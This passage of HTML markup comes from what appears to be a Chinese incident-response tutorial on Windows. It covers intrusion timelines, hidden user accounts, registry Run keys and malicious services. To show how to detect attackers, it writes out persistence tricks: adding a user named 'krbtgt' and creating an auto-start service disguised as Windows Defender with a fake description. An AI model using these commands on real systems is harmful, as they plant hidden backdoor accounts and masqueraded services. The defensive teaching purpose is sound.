+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/7_hu_ed9d75bfe1643b06.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/7_hu_c15cef420eb45162.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;210&#34;
+		data-flex-basis=&#34;504px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;wmic&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;process&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;commandline&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;/value&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;//查看所有进程详细信息
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;wmic&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;process&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;processid=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;17260&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;commandline&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;/value&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//查看pid为17260的详细信息
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/8.png&#34;
+	width=&#34;2556&#34;
+	height=&#34;1151&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/8_hu_42591e7b031ea3f1.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/8_hu_3fde155da76bda5a.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;222&#34;
+		data-flex-basis=&#34;532px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;24时间线排查&#34;&gt;2.4.时间线排查
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;文件落地时间，服务启动时间（在这台主机没有重启的情况下），也可以看文件创建时间，木马查杀时间，网络流量与日志记录的日志时间推测一个大概的时间&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;确定入侵时间线是很重要的,使用evertthing根据入侵事件确定目录下修改或创建的exe文件&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;24767&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;datemodified&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;06&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;06&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;26&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/9.png&#34;
+	width=&#34;1144&#34;
+	height=&#34;271&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/9_hu_3dde7f5ffe49214e.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/9_hu_c7d630402cf703ff.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;422&#34;
+		data-flex-basis=&#34;1013px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/10.png&#34;
+	width=&#34;683&#34;
+	height=&#34;499&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/10_hu_6f7b2a13f0a780ba.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/10_hu_d0dfc5638c931aed.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;136&#34;
+		data-flex-basis=&#34;328px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3后门排查&#34;&gt;3.后门排查
+&lt;/h2&gt;&lt;h3 id=&#34;31恶意用户排查&#34;&gt;3.1.恶意用户排查
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;隐藏用户/克隆用户&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;wmic&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;useraccount&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;/value&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;//一条命令就够了
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;wmic&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;useraccount&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;/value&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;krbtgt&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;/add&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;//最危险的地方就是最安全的地方，krbtgt是域内的票据账号
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;查看注册表&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/11.png&#34;
+	width=&#34;2558&#34;
+	height=&#34;444&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/11_hu_cae25f08ffa537d2.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/11_hu_1a92c57903b0eba7.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;576&#34;
+		data-flex-basis=&#34;1382px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/12.png&#34;
+	width=&#34;1489&#34;
+	height=&#34;999&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/12_hu_7f72dadea7259a8c.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/12_hu_53417f1c7be2008.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;149&#34;
+		data-flex-basis=&#34;357px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;32启动项排查&#34;&gt;3.2.启动项排查
+&lt;/h3&gt;&lt;p&gt;什么是启动项：注册表下的RUN子键(regedit)/服务启动项(Services.msc)/本地组策略启动项(gpedit.msc)/计划任务&lt;/p&gt;
+&lt;h4 id=&#34;注册表启动项&#34;&gt;注册表启动项
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;regedit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;所有用户登录都会触发&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/13.png&#34;
+	width=&#34;1897&#34;
+	height=&#34;614&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/13_hu_f6b0803b38703a83.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/13_hu_7c00e8fc44c667c1.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;308&#34;
+		data-flex-basis=&#34;741px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;33服务项分析排查&#34;&gt;3.3.服务项分析排查
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;创建服务首先需要高权限用户才能创建&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;命令是用于在&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;中创建一个名为&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsDefind&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;的服务&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;其可执行文件位于桌面&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;显示名称模仿了&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Defender&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;并设置为开机自动启动s&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsDefind&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;binpath&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;C:\Users\Administrator\Desktop\WindowsDefind.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;displayname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Micrsoft Windows Defind&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;depend&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcpip&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auto&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;此时使用services.msc可以查看到具体的服务信息，但是没有描述&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/14.png&#34;
+	width=&#34;1370&#34;
+	height=&#34;418&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/14_hu_90dbe9b506e69a77.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/14_hu_58972e94c83f2b95.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;327&#34;
+		data-flex-basis=&#34;786px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;description&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsDefind&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Windows Defender 高级威胁防护服务通过监视和报告计算机上发生的安全事件来防范高级威胁。&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/15.png&#34;
+	width=&#34;1454&#34;
+	height=&#34;279&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/15_hu_33143c5765d407ad.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/15_hu_42ae568a176a4cdc.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;521&#34;
+		data-flex-basis=&#34;1250px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;这谁能知道这个服务是恶意服务呢&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/16.png&#34;
+	width=&#34;1837&#34;
+	height=&#34;388&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/16_hu_656dfb2691132ad8.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/16_hu_46bbd026623955cb.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;473&#34;
+		data-flex-basis=&#34;1136px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsDefind&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//启动服务&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/17.png&#34;
+	width=&#34;2381&#34;
+	height=&#34;303&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/17_hu_9a0f2b8905f2d4d.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/17_hu_b719e91c01210d8f.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;785&#34;
+		data-flex-basis=&#34;1885px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;那么该如何排查呢？&lt;/p&gt;
+&lt;p&gt;先找恶意文件&amp;mdash;在去看是否创建恶意服务&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;找的恶意文件的名称，去注册表中去搜索对应的名称&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/19.png&#34;
+	width=&#34;1377&#34;
+	height=&#34;550&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/19_hu_493693985c85b33f.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/19_hu_13f49ba3735b182a.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;250&#34;
+		data-flex-basis=&#34;600px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;此时就可以搜索到恶意文件路径和服务名称&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/20.png&#34;
+	width=&#34;1542&#34;
+	height=&#34;579&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/20_hu_20d642c9a5dc2f8a.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/20_hu_daec340c7327e368.png 1024w&#34;
